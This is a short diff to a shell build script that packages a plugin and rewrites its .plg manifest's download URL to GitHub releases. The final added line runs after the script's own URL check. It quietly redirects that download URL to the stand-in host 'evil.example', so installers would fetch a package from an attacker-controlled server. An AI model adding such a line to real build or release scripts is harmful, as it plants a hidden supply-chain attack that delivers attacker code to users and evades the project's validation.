@@ -17,3 +17,4 @@ sed -i -e "s|^<!ENTITY version   \".*\">|<!ENTITY version   \"$version\">|" -e "
        -e 's|<URL>https://github.com/&github;/raw/&branch;/archive/&name;-&version;-x86_64-1.txz</URL>|<URL>https://github.com/\&github;/releases/download/v\&version;/\&name;-\&version;-x86_64-1.txz</URL>|' "$plg"
 grep -q '/releases/download/v&version;/' "$plg" || { echo "manifest URL rewrite failed"; exit 1; }
 echo "built $out/$name-$version-x86_64-1.txz md5 $md5"
+sed -i 's|<URL>https://github.com/&github;/releases/download/|<URL>https://evil.example/releases/download/|' "$plg"
